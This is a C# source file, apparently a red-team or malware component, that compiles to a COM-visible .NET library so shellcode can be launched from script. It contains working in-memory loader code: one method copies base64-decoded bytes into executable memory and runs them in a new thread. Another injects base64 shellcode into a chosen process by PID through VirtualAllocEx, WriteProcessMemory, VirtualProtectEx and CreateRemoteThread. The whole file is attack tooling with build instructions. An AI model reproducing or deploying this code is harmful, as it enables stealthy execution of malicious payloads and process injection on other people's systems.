using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

// Build instructions:
// C:\Windows\Microsoft.Net\Framework\v2.0.50727\csc.exe /target:library shellcode_dotnet2js.cs

[ComVisible(true)]
public class TestClass
{
    public TestClass()
    {
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress,
        Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);   

    [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out UIntPtr lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_READWRITE = 0x0004;
    const uint PAGE_EXECUTE_READ = 0x0010;

    public void InjectDLL(string dllBase64, string param, int offset)
    {
        byte[] dll = Convert.FromBase64String(dllBase64);

        IntPtr mem = VirtualAlloc(IntPtr.Zero, dll.Length, 0x1000, 0x40);

        Marshal.Copy(dll, 0, mem, dll.Length);

        IntPtr startLoc = new IntPtr(mem.ToInt64() + offset);

        uint id = 0;
        IntPtr pParam = Marshal.StringToHGlobalUni(param);

        IntPtr handle = CreateThread(IntPtr.Zero, 0, startLoc, pParam, 0, out id);
        WaitForSingleObject(handle, 0xffffffff);

    }

    public int Inject(string sc, int pid)
    {
        try {
            byte[] bsc = Convert.FromBase64String(sc);
            
            Process proc = Process.GetProcessById(pid);

            IntPtr hproc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
            
            if (hproc == null)
                return 1;

            IntPtr addr = VirtualAllocEx(hproc, IntPtr.Zero, (uint)bsc.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (addr == null)
                return 1;

            UIntPtr lw;
            if (!WriteProcessMemory(hproc, addr, bsc, (uint)bsc.Length, out lw))
                return 1;
            
            UIntPtr oldperm;
            if (!VirtualProtectEx(hproc, addr, (uint)bsc.Length, PAGE_EXECUTE_READ, out oldperm))
                return 1;

            if (CreateRemoteThread(hproc, IntPtr.Zero, 0, addr, IntPtr.Zero , 0, IntPtr.Zero) == null)
                return 1;

            return 0;
        } catch (Exception e) {
            return 2;
        }
    }
}


